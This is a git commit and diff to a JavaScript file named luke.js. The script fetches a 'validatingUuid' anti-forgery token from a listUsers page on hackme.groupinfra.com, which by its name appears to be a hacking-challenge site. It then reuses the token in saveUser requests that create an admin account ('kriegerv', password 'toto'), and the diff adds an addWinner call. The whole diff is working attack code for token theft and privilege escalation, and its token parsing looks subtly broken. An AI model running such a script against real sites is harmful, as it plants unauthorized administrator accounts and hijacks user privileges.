04a8fd353edda70d59276da5fe8b4790e59fd648
enopeus <enopeus@gmail.com>
2014-11-26 21:33:07 +0100

    Update luke.js

--- luke.js
+++ luke.js
@@ -5,18 +5,20 @@ if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
 if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/listUsers', false);
 req.send(null);
-JsonObject data = new JsonObject.fromJsonString(req.responseText);
-console.log("0." + data.validatingUuid);
+var validatingUuid = req.responseText.substring(req.responseText.indexOf('name="validatingUuid" value="'),37);
 console.log("1." + req.responseText);
 if(req.responseText){
-var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
+//var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
 console.log("2." + validatingUuid);
-if(validatingUuid){
-var validatingUuidValue = $("[name='validatingUuid']")[0].value;
-console.log("3." + validatingUuidValue);
+//if(validatingUuid){
+//var validatingUuidValue = $("[name='validatingUuid']")[0].value;
+//console.log("3." + validatingUuidValue);
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
 req.send(null);
 console.log("4." + req.responseText);
+req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
+req.send(null);
+console.log("5." + req.responseText);
 }
 }
 }
